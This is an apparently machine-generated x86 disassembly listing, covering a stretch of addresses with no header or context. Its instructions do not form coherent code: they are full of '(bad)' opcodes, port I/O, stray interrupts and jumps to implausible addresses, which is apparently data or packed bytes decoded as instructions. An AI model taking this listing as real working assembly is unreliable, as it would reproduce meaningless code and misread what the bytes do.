  435152:	xor    DWORD PTR ds:0x75a879a9,0xffffffdb
  435159:	std    
  43515a:	(bad)  
  43515b:	mov    eax,0xc94a8b37
  435160:	fs cmp bh,ah
  435163:	out    dx,al
  435164:	icebp  
  435165:	shl    DWORD PTR [bp+di+0x3e7],0x0
  43516b:	jne    0x435148
  43516d:	add    BYTE PTR [eax+eax*1],0x0
  435171:	add    BYTE PTR [eax],al
  435173:	add    BYTE PTR [edi+eiz*8-0x1],dh
  435177:	xor    al,0x25
  435179:	out    dx,al
  43517a:	adc    al,0x25
  43517c:	and    eax,0xfc742f53
  435181:	and    DWORD PTR [eax-0x7d],ebp
  435184:	mov    esp,0x4b8500d3
  435189:	xchg   ebx,eax
  43518a:	add    al,0xcf
  43518c:	into   
  43518d:	fst    QWORD PTR [esi+ecx*8]
  435190:	pop    edi
  435191:	fld    TBYTE PTR [edi+edi*4]
  435194:	and    eax,0xfce82f8d
  435199:	repnz add eax,DWORD PTR [eax]
  43519c:	out    dx,al
  43519d:	xchg   ecx,eax
  43519e:	popa   
  43519f:	test   DWORD PTR [ebx+0x5c],esi
  4351a2:	mov    ecx,0x31a1fc10
  4351a7:	call   0xfa1b6928
  4351ac:	out    dx,al
  4351ad:	leave  
  4351ae:	test   BYTE PTR [esi+0x65],dh
  4351b1:	fisttp DWORD PTR [ecx+0x45]
  4351b4:	(bad)  
  4351b5:	mov    eax,ds:0x472b8531
  4351ba:	mov    WORD PTR [edx+0x49],es
  4351bd:	mov    ah,0xae
  4351bf:	sub    edi,DWORD PTR [ebx-0x26]
  4351c2:	std    
  4351c3:	jmp    FWORD PTR [esi-0x2381f815]
  4351c9:	fcom   st(1)
  4351cb:	stc    
  4351cc:	lock add DWORD PTR [eax+0x217d745c],esi
  4351d3:	sbb    al,0x48
  4351d5:	ret    0x2be
  4351d8:	add    BYTE PTR [eax],al
  4351da:	add    BYTE PTR [eax],al
  4351dc:	add    BYTE PTR [eax-0x54fbc23e],dl
  4351e2:	xor    bl,BYTE PTR [ecx]
  4351e4:	in     al,dx
  4351e5:	mov    ds:0xf003e70b,eax
  4351ea:	aaa    
  4351eb:	inc    ebx
  4351ec:	mov    ebx,DWORD PTR [edi-0x7b]
  4351ef:	mov    ds:0x4337f3f4,eax
  4351f4:	in     al,dx
  4351f5:	inc    ebx
  4351f6:	int    0x9a
  4351f8:	xlat   BYTE PTR ds:[ebx]
  4351f9:	lock out dx,eax
  4351fb:	gs pop edx
  4351fd:	gs add bl,dl
  435200:	xor    BYTE PTR [edi+0x4cd782c9],0x15
  435207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435208:	lock ficom WORD PTR ss:[ebx+eax*8]
  43520d:	clc    
  43520e:	fild   DWORD PTR ds:[eax-0x40a7b24b]
  435215:	test   DWORD PTR [ebp+0x27503f1],0x857503e7
  43521f:	dec    edi
  435220:	add    BYTE PTR [esi+0x44],al
  435223:	outs   dx,BYTE PTR ds:[esi]
  435224:	inc    esi
  435225:	push   ecx
  435226:	jg     0x435258
  435228:	pop    esp
  435229:	je     0x4352a8
  43522b:	test   eax,0x3ec1a01b
  435230:	add    cl,BYTE PTR [eax-0x3e]
  435233:	outs   dx,BYTE PTR ds:[esi]
  435234:	and    DWORD PTR cs:[eax+ebp*8+0x2a],ebx
  435239:	mov    edx,0x8d2db733
  43523e:	jmp    0x0:0x3cf
  435245:	add    BYTE PTR [ebp+0x7d],dh
  435248:	test   eax,0x6608f867
  43524d:	rol    BYTE PTR [ebp-0x5550ff87],0xda
  435254:	ja     0x435248
  435256:	inc    ebx
  435257:	retf   0xf785
  43525a:	addr16 ret 0x2837
  43525e:	inc    ecx
  43525f:	sub    ecx,DWORD PTR [ecx]
  435261:	jl     0x435299
  435263:	sub    eax,0x7d74a97d
  435268:	jecxz  0x43528e
  43526a:	ss jle 0x4352af
  43526d:	dec    ebp
  43526e:	(bad)  
  43526f:	xor    al,0x5c
  435271:	repnz xor al,0x4d
  435274:	xor    esp,DWORD PTR [esp+eiz*8+0x4a]
  435278:	add    DWORD PTR [edx-0x48],esi
  43527b:	or     bh,ch
  43527d:	mov    dl,0x1f
  43527f:	leave  
  435280:	mov    al,cs:0xab25028c
  435286:	inc    esi
  435287:	aaa    
  435288:	push   edx
  435289:	xchg   ecx,eax
  43528a:	daa    
  43528b:	or     eax,DWORD PTR [eax]
  43528d:	jmp    0x62af8791
  435292:	mov    BYTE PTR [ebp-0x3c],al
  435295:	fldl2t 
  435297:	xor    al,0x5c
  435299:	push   ecx
  43529a:	addr16 int 0xf9
  43529d:	pop    esi
  43529e:	inc    DWORD PTR [edi*2+0xac7c6d1]
  4352a5:	gs push ecx
  4352a7:	leave  
  4352a8:	stc    
  4352a9:	inc    esi
  4352aa:	add    BYTE PTR [eax],al
  4352ac:	add    BYTE PTR [eax],al
  4352ae:	add    BYTE PTR [ebx-0x76],ch
  4352b1:	(bad)  
  4352b2:	call   0x629d552d
  4352b7:	xchg   ebp,eax
  4352b8:	sub    edi,DWORD PTR [ebp-0x33494de3]
  4352be:	xor    eax,0x2dccb6ba
  4352c3:	mov    dl,0xb6
  4352c5:	int3   
  4352c6:	mov    esp,0xb74dd6ef
  4352cb:	out    dx,eax
  4352cc:	push   ebx
  4352cd:	or     BYTE PTR [eax],al
  4352cf:	adc    ebp,DWORD PTR [ecx+edi*8-0x1]
  4352d3:	pop    esp
  4352d4:	add    eax,DWORD PTR [ebx+0x7405d7ff]
  4352da:	cmp    eax,0xfffffe52
  4352df:	scas   eax,DWORD PTR es:[edi]
  4352e0:	and    DWORD PTR [ebx-0x382db02],eax
  4352e6:	jmp    FWORD PTR [ebx]
  4352e8:	jns    0x435328
  4352ea:	je     0x435355
  4352ec:	enter  0xfffa,0x1c
  4352f0:	xor    al,BYTE PTR [edx]
  4352f2:	sub    DWORD PTR [ecx-0x6],0xffffffff
  4352f6:	push   cs
  4352f7:	nop
  4352f8:	ss cli 
  4352fa:	dec    DWORD PTR [eax+ecx*2]
  4352fd:	ror    BYTE PTR [edi],0xa0
  435300:	add    eax,0x821cfffa
  435305:	clc    
  435306:	add    ebx,DWORD PTR [esi+0x5a]
  435309:	add    DWORD PTR [esi+0x54],0x79
  43530d:	inc    esi
  43530e:	pop    eax
  43530f:	sbb    BYTE PTR [si-0x75],ch
  435313:	add    BYTE PTR [eax],al
  435315:	add    BYTE PTR [eax],al
  435317:	add    dl,ch
  435319:	test   dl,0xe0
  43531c:	push   edi
  43531d:	inc    eax
  43531e:	cmp    BYTE PTR [edi],cl
  435320:	mov    ds:0x6f02093a,al
  435325:	ret    
  435326:	sbb    eax,DWORD PTR [esi+0x0]
  435329:	jp     0x435371
  43532b:	inc    esp
  43532c:	outs   dx,DWORD PTR ds:[esi]
  43532d:	lods   al,BYTE PTR ds:[esi]
  43532e:	adc    DWORD PTR [esi+0xc],0x7c
  435332:	ds dec eax
  435334:	ret    0x479
  435337:	inc    ecx
  435338:	mov    dl,0x7b
  43533a:	add    al,0x7a
  43533c:	pop    ss
  43533d:	inc    eax
  43533e:	ins    BYTE PTR es:[edi],dx
  43533f:	and    edi,edx
  435341:	test   BYTE PTR [edx-0x510223aa],0x4
  435348:	(bad)  
  435349:	jns    0x435391
  43534b:	dec    eax
  43534c:	jne    0x4353b2
  43534e:	sub    al,BYTE PTR [ebx+edx*1+0x64]
  435352:	push   edx
  435353:	ins    BYTE PTR es:[edi],dx
  435354:	fist   DWORD PTR [edx+0x18]
  435357:	inc    esi
  435358:	lock sbb edx,DWORD PTR [eax+0x19]
  43535c:	out    dx,al
  43535d:	popf   
  43535e:	popa   
  43535f:	test   ebx,eax
  435361:	xchg   DWORD PTR [eax],ebp
  435363:	enter  0xb1f4,0xfb
  435367:	dec    BYTE PTR [edx-0x24]
  43536a:	sbb    dh,al
  43536c:	retf   0x2dde
  43536f:	push   edx
  435370:	dec    ebp
  435371:	test   BYTE PTR [ecx],dl
  435373:	add    BYTE PTR [ebp+0x58],dh
  435376:	mov    ecx,0x641dfc08
  43537b:	jge    0x43537d
  43537d:	add    BYTE PTR [eax],al
  43537f:	add    BYTE PTR [eax],al
  435381:	mov    ds:0xf708ff3b,eax
  435386:	(bad)  
  435387:	cld    
  435388:	push   DWORD PTR [ebp-0xb]
  43538b:	xchg   BYTE PTR [edx-0x67],cl
  43538e:	std    
  43538f:	es dec edx
  435391:	test   DWORD PTR [eax+0x6b],esp
  435394:	mov    al,ds:0x85fddb63
  435399:	cmp    edi,ebx
  43539b:	xchg   BYTE PTR [edx-0x251ef],bh
  4353a1:	jb     0x4353a7
  4353a3:	(bad)  
  4353a4:	(bad)  
  4353a5:	in     al,dx
  4353a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4353a7:	sub    al,0x85
  4353a9:	jmp    0x43532e
  4353ab:	jmp    0x4353ac
  4353ad:	retf   0x9350
  4353b0:	mov    al,ds:0x2bfddb6b
  4353b5:	jbe    0x43541a
  4353b7:	stc    
  4353b8:	xor    eax,0x129d5d74
  4353bd:	jne    0x43539a
  4353bf:	add    al,0xb2
  4353c1:	mov    ch,0xdc
  4353c3:	mov    edx,DWORD PTR [eax+0x3da1a5]
  4353c9:	sbb    eax,DWORD PTR [edx]
  4353cb:	call   0xe3ae3b47
  4353d0:	add    esi,DWORD PTR [ebp+0x77]
  4353d3:	imul   ebp,DWORD PTR [ebp-0x23],0xfffffffe
  4353d7:	out    0x3,al
  4353d9:	bnd ret 
  4353db:	add    dl,ah
  4353dd:	jne    0x4353e1
  4353df:	aas    
  4353e0:	add    esp,DWORD PTR [edx-0x3b]
  4353e3:	out    0x5d,eax
  4353e5:	add    BYTE PTR [eax],al
  4353e7:	add    BYTE PTR [eax],al
  4353e9:	add    BYTE PTR [eax+0x7c0776ba],ah
  4353ef:	lea    esi,[eax-0x287cf8fd]
  4353f5:	cmp    al,0xb5
  4353f7:	add    bh,BYTE PTR [esi-0x477293ff]
  4353fd:	lds    ebx,FWORD PTR [ebx]
  4353ff:	std    
  435400:	icebp  
  435401:	cdq    
  435402:	stos   DWORD PTR es:[edi],eax
  435403:	shl    BYTE PTR [eax],cl
  435405:	inc    esp
  435406:	jne    0x435464
  435408:	call   0xe0bd4b7c
  43540d:	add    esi,DWORD PTR [ebp+0x79]
  435410:	imul   esi,DWORD PTR [eax+0x67],0x3a16e702
  435417:	sbb    DWORD PTR [esi-0xe5e08f3],esp
  43541d:	add    esi,DWORD PTR [ebp+0x79]
  435420:	sub    DWORD PTR [esp+edi*2+0x6e],esp
  435424:	test   al,0x1d
  435426:	aaa    
  435427:	dec    esi
  435428:	pop    esi
  435429:	int    0xf0
  43542b:	xor    esi,ebx
  43542d:	push   cs
  43542e:	test   DWORD PTR [ecx+0x4d7503e7],0xca86b2
  435438:	aad    0x35
  43543a:	sub    eax,0xb263a17b
  43543f:	sar    DWORD PTR es:[esi+0x47],cl
  435443:	push   esi
  435444:	outs   dx,BYTE PTR ds:[esi]
  435445:	xor    ch,BYTE PTR ds:0x4ea70079
  43544b:	jg     0x43548f
  43544d:	icebp  
  43544e:	add    BYTE PTR [eax],al
  435450:	add    BYTE PTR [eax],al
  435452:	add    BYTE PTR [edi-0x70],dh
  435455:	inc    esp
  435456:	jmp    0x4354c8
  435458:	mov    bh,0xdd
  43545a:	jb     0x435493
  43545c:	ds sub eax,0x5440522a
  435462:	bound  esp,QWORD PTR [edi-0x515078f2]
  435468:	stc    
  435469:	mov    al,0xe5
  43546b:	mov    ecx,0x9f62d5e5
  435470:	inc    edx
  435471:	bound  esp,QWORD PTR [eax+0x7d]
  435474:	sub    al,0x9
  435476:	sahf   
  435477:	mov    esp,0x812f8556
  43547c:	jge    0x4354d0
  43547e:	sub    eax,0x23047bcf
  435483:	inc    esi
  435484:	cmp    DWORD PTR [eax-0x7e],esp
  435487:	jno    0x43548b
  435489:	add    cl,ch
  43548b:	mov    ebp,0x766ae791
  435490:	add    al,BYTE PTR [eax]
  435492:	call   0x3fc8ab53
  435497:	jns    0x43545e
  435499:	push   ebx
  43549a:	or     eax,0xae583882
  43549f:	lods   al,BYTE PTR ds:[esi]
  4354a0:	bound  eax,QWORD PTR [eax]
  4354a2:	jmp    0x3f4c571d
  4354a7:	jo     0x435524
  4354a9:	inc    edx
  4354aa:	xor    DWORD PTR [edx],ebp
  4354ac:	jecxz  0x4354b7
  4354ae:	aas    
  4354af:	cwde   
  4354b0:	ret    
  4354b1:	cs test al,0x9b
  4354b4:	inc    eax
  4354b5:	push   esp
  4354b6:	jo     0x4354b8
  4354b8:	add    BYTE PTR [eax],al
  4354ba:	add    BYTE PTR [eax],al
  4354bc:	cmp    al,0x3a
  4354be:	in     eax,0xbc
  4354c0:	inc    ebx
  4354c1:	xor    BYTE PTR [edx+eiz*2+0x2c],ch
  4354c5:	or     al,BYTE PTR [esi-0x7582871b]
  4354cb:	add    ah,bh
  4354cd:	leave  
  4354ce:	stc    
  4354cf:	jmp    DWORD PTR [edi]
  4354d1:	dec    ecx
  4354d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4354d3:	push   ss
  4354d4:	mov    edi,?
  4354d6:	sub    bh,bh
  4354d8:	mov    edx,0x74a3c46
  4354dd:	dec    ecx
  4354de:	mov    al,ds:0x82ff8c16
  4354e3:	mov    es,WORD PTR [ecx+ecx*8]
  4354e6:	stc    
  4354e7:	call   esp
  4354e9:	sti    
  4354ea:	or     BYTE PTR [ecx],al
  4354ec:	rcr    BYTE PTR [edi+0x4c000e],cl
  4354f2:	scas   al,BYTE PTR es:[edi]
  4354f3:	shr    dl,0xfd
  4354f6:	fwait
  4354f7:	xchg   BYTE PTR [eax-0x38000001],ch
  4354fd:	sbb    BYTE PTR [esi+edx*1-0x7b7b00b4],0xca
  435505:	dec    edx
  435506:	add    BYTE PTR [eax],al
  435508:	sbb    al,0xee
  43550a:	leave  
  43550b:	sub    esp,edi
  43550d:	test   BYTE PTR [ebp-0xb560],0xe
  435514:	mov    eax,0x484ef7bc
  435519:	inc    ebp
  43551a:	repnz add DWORD PTR [edx+0xff7d62],esi
  435521:	add    BYTE PTR [eax],al
  435523:	add    BYTE PTR [eax],al
  435525:	adc    edi,DWORD PTR [ebx-0x3a]
  435528:	std    
  435529:	jecxz  0x4354db
  43552b:	or     DWORD PTR [esi-0x60],0x7b
  43552f:	sar    DWORD PTR [eax-0x25],0x45
  435533:	ds cmp bh,cl
  435536:	mov    edi,0xbf1f02e3
  43553b:	adc    DWORD PTR [esi-0x30],0x24
  43553f:	add    BYTE PTR [ebx],ch
  435541:	lea    ecx,[eax+edx*2]
  435544:	push   esi
  435545:	and    al,0xf1
  435547:	sub    eax,0x7cd97500
  43554c:	inc    edx
  43554d:	and    DWORD PTR [eax+0xe],esp
  435550:	jge    0x435503
  435552:	test   al,0x76
  435554:	inc    edx
  435555:	inc    ecx
  435556:	xor    DWORD PTR [edi-0x8],ebp
  435559:	call   0xed91:0xf60a7b0b
  435560:	(bad)  
  435561:	jnp    0x4355b9
  435563:	jae    0x435560
  435565:	and    bl,0x2e
  435568:	pop    edx
  435569:	inc    esi
  43556a:	sbb    DWORD PTR [ebx],ebp
  43556c:	pop    ebx
  43556d:	ss and eax,0xf3fe6c46
  435573:	cmp    al,0x77
  435576:	cmp    eax,0xab77b702
  43557b:	std    
  43557c:	push   esi
  43557e:	cs stc 
  435580:	add    edi,esp
  435582:	cmp    DWORD PTR [ecx+0x52ab7512],edx
  435588:	cmp    eax,DWORD PTR [eax]
  43558a:	add    BYTE PTR [eax],al
  43558c:	add    BYTE PTR [eax],al
  43558e:	out    dx,al
  43558f:	add    DWORD PTR [eax],esi
  435591:	add    DWORD PTR [edi+0x54],0x7
  435595:	test   DWORD PTR [ebx+0xec60303],edi
  43559b:	scas   al,BYTE PTR es:[edi]
  43559c:	adc    al,0xc7
  43559e:	mov    BYTE PTR [edx+eax*8],0x50
  4355a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4355a3:	sbb    esp,ebx
  4355a5:	loop   0x4355e7
  4355a7:	stos   DWORD PTR es:[edi],eax
  4355a8:	std    
  4355a9:	test   BYTE PTR [ebx-0x9c584f1],ch
  4355af:	outs   dx,DWORD PTR ds:[esi]
  4355b0:	in     eax,dx
  4355b1:	xchg   BYTE PTR [ebx-0x11],cl
  4355b4:	fild   DWORD PTR [edx-0x13]
  4355b7:	mov    al,dl
  4355b9:	test   DWORD PTR [ebx+0x7c],edi
  4355bc:	mov    dh,0x37
  4355be:	sub    eax,0xe80930db
  4355c3:	push   0x2f
  4355c5:	push   ebp
  4355c6:	clc    
  4355c7:	add    ch,BYTE PTR [eax+0x66c51e05]
  4355cd:	xchg   ecx,eax
  4355ce:	adc    eax,0x7503e719
  4355d3:	ss (bad) 
  4355d6:	inc    edi
  4355d7:	pop    esi
  4355d8:	ins    BYTE PTR es:[edi],dx
  4355d9:	mov    ch,0x1d
  4355db:	or     DWORD PTR [esi+0x41],ebp
  4355de:	pop    ebp
  4355df:	add    eax,0xf493dc1d
  4355e4:	pop    ds
  4355e5:	pop    ebp
  4355e6:	jne    0x4355d5
  4355e8:	and    al,0x33
  4355ea:	xor    bl,BYTE PTR [eax+0xf]
  4355ed:	jo     0x435635
  4355ef:	add    ah,bh
  4355f1:	jl     0x4355f3
  4355f3:	add    BYTE PTR [eax],al
  4355f5:	add    BYTE PTR [eax],al
  4355f7:	(bad)  
  4355f8:	cs pop esi
  4355fa:	adc    eax,ebp
  4355fc:	(bad)  
  4355fd:	xlat   BYTE PTR ds:[ebx]
  4355fe:	jp     0x4355c7
  435600:	pop    esi
  435601:	(bad)  
  435603:	fs shl edx,0x7b
  435607:	ja     0x43558e
  435609:	outs   dx,DWORD PTR ds:[esi]
  43560a:	repz dec edx
  43560c:	adc    BYTE PTR [ebx+0x64],ch
  43560f:	cmp    al,0xc1
  435611:	fisubr DWORD PTR [edi]
  435613:	lahf   
  435614:	lea    esp,[esi-0x643a31d5]
  43561a:	sar    BYTE PTR [ecx],0xce
  43561d:	mov    bl,0xc0
  43561f:	xor    esi,ecx
  435621:	stos   DWORD PTR es:[edi],eax
  435622:	shr    BYTE PTR [ecx],0xce
  435625:	sbb    al,0x7b
  435627:	and    DWORD PTR [ebp+0x11],edx
  43562a:	jnp    0x4355b2
  43562c:	or     bh,BYTE PTR [edx]
  43562e:	mov    eax,DWORD PTR [edx]
  435630:	shl    edi,0x3
  435633:	lock rcr BYTE PTR [esi+0x3e],0x69
  435638:	adc    DWORD PTR [eax-0x183f15fa],0x52
  43563f:	cdq    
  435640:	lea    edi,[ecx-0x24]
  435643:	aas    
  435644:	mov    ebx,0x86c27600
  435649:	dec    edx
  43564a:	cmc    
  43564b:	icebp  
  43564c:	mov    eax,0x276e802
  435651:	ins    DWORD PTR es:[edi],dx
  435652:	repz idiv DWORD PTR [esp+ecx*1]
  435656:	jmp    0xeb6fdb0e
  43565b:	add    BYTE PTR [eax],al
  43565d:	add    BYTE PTR [eax],al
  43565f:	add    BYTE PTR [esi+0x2],dh
  435662:	xor    DWORD PTR [eax],0xffffffa2
  435665:	test   dl,dl
  435667:	jmp    0x4356df
  435669:	add    ch,BYTE PTR ds:0xfdb8f629
  43566f:	mov    edx,0xb1428749
  435674:	dec    DWORD PTR [ebx+0x58]
  435677:	jb     0x4356bc
  435679:	test   DWORD PTR cs:[edi+0x62e0cd8a],edx
  435680:	stos   DWORD PTR es:[edi],eax
  435681:	cli    
  435682:	or     BYTE PTR [edi],bh
  435684:	mov    ch,0xf
  435686:	(bad)  
  435687:	mov    ecx,0x9d421e31
  43568c:	iret   
  43568d:	dec    esp
  43568e:	inc    esp
  43568f:	retf   0x863c
  435692:	push   edx
  435693:	sub    eax,eax
  435695:	inc    esp
  435696:	dec    eax
  435697:	inc    edi
  435698:	mov    esi,0xb04f3f06
  43569d:	push   es
  43569e:	jbe    0x435702
  4356a0:	push   0x7d371d2e
  4356a5:	test   DWORD PTR [edx+0x29],edx
  4356a8:	sbb    dh,BYTE PTR [ebx+0x4]
  4356ab:	and    ecx,DWORD PTR [esi+0x4062484c]
  4356b1:	inc    esi
  4356b2:	bound  esi,QWORD PTR [edx-0x50]
  4356b5:	bound  esi,QWORD PTR cs:[eax+0x6a]
  4356b9:	dec    eax
  4356ba:	test   DWORD PTR [edi],esp
  4356bc:	pop    ecx
  4356bd:	test   DWORD PTR [edx+0x19],edx
  4356c0:	cli    
  4356c1:	sar    cl,0x0
  4356c4:	add    BYTE PTR [eax],al
  4356c6:	add    BYTE PTR [eax],al
  4356c8:	add    ah,cl
  4356ca:	add    eax,DWORD PTR [ecx+0x4e3d744e]
  4356d0:	fs push ebp
  4356d2:	dec    ebp
  4356d3:	pusha  
  4356d4:	test   DWORD PTR [eax+ebx*2],ebx
  4356d7:	inc    edx
  4356d8:	cmp    ecx,DWORD PTR [edx-0x7d]
  4356db:	add    BYTE PTR [eax],al
  4356dd:	int3   
  4356de:	push   esp
  4356df:	cmp    cl,BYTE PTR [ebx+0x4e835ff2]
  4356e5:	test   al,0x1c
  4356e7:	rol    BYTE PTR [ecx-0x6fabb],1
  4356ed:	mov    WORD PTR [ecx+ecx*8],cs
  4356f0:	ja     0x43567e
  4356f2:	repz dec ebp
  4356f4:	call   0x4365dd
  4356f9:	cmpxchg8b QWORD PTR [eax]
  4356fc:	mov    edx,edx
  4356fe:	and    edi,DWORD PTR [ebx-0x8]
  435701:	popa   
  435702:	pop    eax
  435703:	push   ss
  435704:	cmp    edx,ebx
  435706:	cmp    eax,DWORD PTR [eax]
  435708:	add    BYTE PTR [edi+edx*2+0xb],cl
  43570c:	xor    DWORD PTR [esp+eax*1+0x6d],0x11
  435711:	xlat   BYTE PTR ds:[ebx]
  435712:	cmc    
  435713:	imul   ebp,DWORD PTR [ebx],0xffffffe2
  435716:	push   edx
  435717:	jns    0x435713
  435719:	dec    esp
  43571a:	mov    bl,0xf9
  43571c:	jmp    DWORD PTR [edx-0x43817eff]
  435722:	cmp    DWORD PTR [esi],edi
  435724:	js     0x4356c5
  435726:	into   
  435727:	sti    
  435728:	push   cs
  435729:	mov    ds,WORD PTR [edi-0x7]
  43572c:	inc    DWORD PTR [eax]
  43572e:	add    BYTE PTR [eax],al
  435730:	add    BYTE PTR [eax],al
  435732:	or     al,0xc
  435734:	ds pusha 
  435736:	sbb    eax,DWORD PTR [esi+0x31c0164]
  43573c:	pop    esi
  43573d:	mov    eax,DWORD PTR [edx+0x22]
  435740:	pop    esi
  435741:	sub    eax,DWORD PTR [edx+0x2a]
  435744:	add    DWORD PTR [esi+0x75],0x5
  435748:	ja     0x435794
  43574a:	popa   
  43574b:	pop    es
  43574c:	pop    ss
  43574d:	int    0xee
  43574f:	es test al,0x12
  435752:	jne    0x4356fd
  435754:	jp     0x4357d2
  435756:	jge    0x43578e
  435758:	jbe    0x43579c
  43575a:	dec    ebp
  43575b:	loopne 0x4356f1
  43575d:	(bad)  
  43575e:	out    dx,al
  43575f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435761:	adc    dh,BYTE PTR [ebp-0x57]
  435764:	arpl   WORD PTR [edi-0x6587837f],ax
  43576a:	aad    0xb6
  43576c:	std    
  43576d:	(bad)  
  43576e:	out    dx,al
  43576f:	pop    esi
  435770:	ins    BYTE PTR es:[edi],dx
  435771:	adc    dh,BYTE PTR [ebp-0x57]
  435774:	sbb    ebp,edi
  435776:	cli    
  435777:	lods   al,BYTE PTR ds:[esi]
  435778:	out    0x8,eax
  43577a:	ret    
  43577b:	call   0xa8c65706
  435780:	std    
  435781:	(bad)  
  435782:	fmul   DWORD PTR [eax-0xe]
  435785:	push   DWORD PTR [edx-0x5b]
  435788:	xchg   ebx,eax
  435789:	nop
  43578a:	bound  edi,QWORD PTR gs:0x69aadb00
  435791:	xchg   edx,eax
  435792:	std    
  435793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435794:	std    
  435795:	inc    DWORD PTR [eax]
  435797:	add    BYTE PTR [eax],al
  435799:	add    BYTE PTR [eax],al
  43579b:	add    BYTE PTR [eax],dh
  43579d:	jb     0x435737
  43579f:	jno    0x43574c
  4357a1:	std    
  4357a2:	jle    0x4357d8
  4357a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4357a5:	int3   
  4357a6:	add    BYTE PTR [ebp+0x63],dh
  4357a9:	std    
  4357aa:	(bad)  
  4357ab:	xor    ch,BYTE PTR [ebx+eiz*2+0x593d35]
  4357b2:	or     edx,ebp
  4357b4:	jb     0x4357b2
  4357b6:	mov    cl,0xf4
  4357b8:	jnp    0x4357ef
  4357ba:	inc    eax
  4357bb:	jne    0x43577d
  4357bd:	cli    
  4357be:	or     dl,al
  4357c0:	call   0x95f2:0x27ae6be
  4357c7:	jnp    0x43577b
  4357c9:	xor    BYTE PTR [ebp+esi*2+0x24],al
  4357cd:	call   0xe0ce4f41
  4357d2:	add    esi,DWORD PTR [ebp-0x77]
  4357d5:	imul   ebp,DWORD PTR [edi-0x79],0x1018e702
  4357dc:	repnz lahf 
  4357de:	or     dh,bh
  4357e0:	(bad)  
  4357e2:	add    esi,DWORD PTR [ebp-0x77]
  4357e5:	test   eax,0x28966c4b
  4357ea:	js     0x4357ac
  4357ec:	jmp    0x368a5a27
  4357f1:	retw   
  4357f3:	lahf   
  4357f4:	mov    ebp,DWORD PTR [ecx-0x10b00db5]
  4357fa:	jle    0x435836
  4357fc:	add    ch,al
  4357fe:	sub    eax,0x0
  435803:	add    BYTE PTR [ecx],bl
  435805:	mov    DWORD PTR [ecx-0x652ab7a1],edx
  43580b:	or     eax,0x78af44f0
  435810:	mov    edi,0xa12d5e5a
  435815:	rol    DWORD PTR [edi],1
  435817:	js     0x4357c8
  435819:	cli    
  43581a:	icebp  
  43581b:	xchg   ebp,eax
  43581c:	test   eax,0x1210e513
  435821:	loope  0x4357cb
  435823:	aaa    
  435824:	lock dec ebx
  435826:	mov    ds:0xf24ab77a,eax
  43582b:	xchg   edx,eax
  43582c:	jno    0x435871
  43582e:	push   es
  43582f:	scas   al,BYTE PTR es:[edi]
  435830:	clc    
  435831:	push   ebx
  435832:	daa    
  435833:	(bad)
  435838:	in     eax,0x43
  43583a:	push   ebx
  43583b:	jg     0x4357ec
  43583d:	dec    edx
  43583e:	outs   dx,BYTE PTR ds:[esi]
  43583f:	xor    bh,BYTE PTR [ecx+0x75600024]
  435845:	inc    esp
  435846:	mov    ch,0xe8
  435848:	jbe    0x43584c
  43584a:	add    BYTE PTR [esi+0x5a733a3f],ah
  435850:	js     0x4358aa
  435852:	ins    BYTE PTR es:[edi],dx
  435853:	push   0x3c
  435855:	or     al,BYTE PTR [eax]
  435857:	bound  esi,QWORD PTR [edi]
  435859:	shr    DWORD PTR cs:[edi],0x39
  43585d:	add    al,BYTE PTR [eax]
  43585f:	jmp    0x9861bda
  435864:	jae    0x435868
  435866:	add    cl,ch
  435868:	add    BYTE PTR [eax],al
  43586a:	add    BYTE PTR [eax],al
  43586c:	add    BYTE PTR [edi-0x519b1c80],bh
  435872:	mov    edx,0x815ab785
  435877:	into   
  435878:	shl    DWORD PTR [edi-0x79],1
  43587b:	dec    edx
  43587c:	adc    DWORD PTR [edx-0x3c],edi
  43587f:	in     eax,0xeb
  435881:	add    ebp,0x66
  435884:	jmp    0x9893d4fc
  435889:	inc    esp
  43588a:	stos   BYTE PTR es:[edi],al
  43588b:	daa    
  43588c:	cli    
  43588d:	jbe    0x435891
  43588f:	test   DWORD PTR [edi+0x6a3a8722],esi
  435895:	xor    eax,0x92a78713
  43589a:	stos   BYTE PTR es:[edi],al
  43589b:	xchg   DWORD PTR [esi+ebp*1],edx
  43589e:	mov    edx,0x34f3df85
  4358a3:	adc    cl,ch
  4358a5:	dec    edi
  4358a6:	sub    DWORD PTR [ebx+0x59ba3ff4],0x55c26b8f
  4358b0:	inc    esp
  4358b1:	xor    bh,BYTE PTR [esi]
  4358b3:	jp     0x435906
  4358b5:	jns    0x4358c0
  4358b7:	test   BYTE PTR [edx+0x76],bh
  4358ba:	add    al,BYTE PTR [eax]
  4358bc:	bound  esi,QWORD PTR [esi+ebp*1+0xe620085]
  4358c3:	add    BYTE PTR [esp+eax*1-0x37],0x83
  4358c8:	xchg   esi,eax
  4358c9:	cld    
  4358ca:	mov    cl,0xf9
  4358cc:	call   DWORD PTR [edi+0x16a439]
  4358d2:	add    BYTE PTR [eax],al
  4358d4:	add    BYTE PTR [eax],al
  4358d6:	or     al,0x0
  4358d8:	sub    edi,edi
  4358da:	jp     0x435919
  4358dc:	cmp    al,0x51
  4358de:	push   edi
  4358df:	xor    DWORD PTR [eax-0x7d0033ea],ebx
  4358e5:	mov    gs,WORD PTR [ecx+esi*4]
  4358e8:	stc    
  4358e9:	inc    DWORD PTR [ebx+edi*4+0x3]
  4358ed:	add    DWORD PTR [edx],esp
  4358ef:	pop    edi
  4358f0:	push   cs
  4358f1:	add    ah,cl
  4358f3:	mov    eax,0x6aad0af
  4358f8:	pushf  
  4358f9:	xchg   esi,eax
  4358fa:	sub    bh,bh
  4358fc:	(bad)  
  4358fd:	call   DWORD PTR [ecx]
  4358ff:	cmp    ecx,DWORD PTR [esi-0x736c]
  435905:	mov    cl,BYTE PTR [edx]
  435907:	and    ecx,DWORD PTR [esi]
  435909:	add    BYTE PTR [esp+ebx*1+0x5f1a39bb],bl
  435910:	push   cs
  435911:	add    BYTE PTR [edx+edx*2-0x1c3d74d9],cl
  435918:	jl     0x4358e3
  43591a:	adc    al,0x0
  43591c:	add    DWORD PTR [esi+0x44],0x4
  435920:	mov    ecx,0xc0144eeb
  435925:	mov    edi,edx
  435927:	push   edx
  435928:	bound  eax,QWORD PTR [eax]
  43592a:	daa    
  43592b:	jbe    0x435977
  43592d:	push   eax
